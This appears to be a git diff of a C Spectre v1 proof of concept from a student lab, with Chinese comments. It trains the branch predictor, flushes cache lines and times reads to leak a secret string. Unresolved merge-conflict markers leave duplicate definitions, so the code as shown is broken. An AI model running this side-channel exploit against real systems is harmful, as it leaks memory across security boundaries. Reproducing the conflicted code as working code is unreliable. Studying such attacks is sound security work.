@@ -31,7 +31,12 @@ uint8_t attack_controled_array[256 * 512];//256个cache line
 
 char* secret = "NingXiaUniversity@xgy";
 
+<<<<<<< HEAD
 uint8_t temp = 0;//避免被优化
+=======
+//秘密信息：target
+char* secret = "NingXiaUniversity@sgy";
+>>>>>>> ubuntu22
 
 void victim_function(size_t x)
 {
@@ -48,7 +53,16 @@ analysis code
 //设置阈值 80
 #define CACHE_HIT_THRESHOLD (80)
 
+<<<<<<< HEAD
 //最优猜测：value[0]，次优猜测值：value[1]
+=======
+//设置cache hit的周期阈值
+#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+
+
+
+//最优guess：value[0]，次优guess：value[1]
+>>>>>>> ubuntu22
 void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int score[2])
 {
 	static int results[256];
@@ -74,15 +88,25 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 			_mm_clflush(&attack_controled_array[i * 512]);
 
 		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。
+<<<<<<< HEAD
 		training_x = tries % victim_controled_array_size;
 		for(j = 29; j >= 0; j--)
 		{ 
 			_mm_clflush(&victim_controled_array_size);//将victim_controled_array_size从cache中擦除
 			
+=======
+		//array1_size=16
+		training_x = tries % array1_size;
+		for (j = 29; j >= 0; j--)
+		{  
+			_mm_clflush(&array1_size);//将array_size从cache中擦除
+
+>>>>>>> ubuntu22
 			for (volatile int z = 0; z < 100; z++)
 			{
 				/* Delay (can also mfence) */
 			} 
+			asm volatile("mfence\n");//这一部分是必须的
 			
 			//控制5次training_x，1次malicious_x
 			x = ((j % 6) - 1) & ~0xFFFF; 
@@ -94,7 +118,7 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 			//当x=-1时,存储补码0xfffffff，x=malicious_x
 			x = training_x ^ (x & (malicious_x ^ training_x));
 			victim_function(x);
-		}
+		}//for
 
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
